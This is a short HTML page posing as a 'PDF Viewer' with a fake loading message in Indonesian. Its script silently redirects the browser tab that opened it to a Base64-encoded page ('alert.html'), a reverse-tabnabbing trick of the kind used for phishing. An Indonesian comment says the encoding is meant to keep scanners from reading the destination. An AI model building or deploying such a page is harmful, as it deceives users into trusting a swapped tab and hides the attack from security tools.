<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>PDF Viewer</title>
</head>
<body>
    <div style="text-align: center; margin-top: 20%; font-family: sans-serif;">
        <h3>Memuat Dokumen... 0%</h3>
        <p>Mohon tunggu sebentar.</p>
    </div>

    <script>
        if (window.opener) {
            setTimeout(function() {
                // "YWxlcnQuaHRtbA==" adalah Base64 dari "alert.html"
                // Ini teknik dasar biar scanner nggak langsung baca string file tujuan
                var target = atob("YWxlcnQuaHRtbA=="); 
                window.opener.location = target;
                console.log("Status: Update dikirim ke tab asal.");
            }, 1500);
        }
    </script>
</body>
</html>
